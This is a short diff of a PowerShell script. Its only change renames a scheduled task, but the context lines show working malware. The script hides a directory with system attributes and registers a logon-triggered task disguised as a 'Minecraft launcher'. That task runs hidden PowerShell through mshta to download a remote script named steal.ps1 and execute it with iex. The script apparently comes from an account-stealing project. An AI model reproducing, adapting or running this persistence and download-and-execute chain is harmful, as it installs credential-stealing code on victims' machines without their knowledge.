@@ -10,7 +10,7 @@ $startupfolder = (New-Object -ComObject WScript.Shell).SpecialFolders("AllUsersS
 New-Item -ItemType Directory -Path $dir
 attrib +h +s $dir
 
-$task_name = "Minecraft launcher"
+$task_name = "Minecraftlauncher"
 $task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `iwr('https://raw.githubusercontent.com/s1uiasdad/log-acc-v2/main/scr/steal.ps1')|iex`",0)(window.close)"
 $task_trigger = New-ScheduledTaskTrigger -AtLogOn
 $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
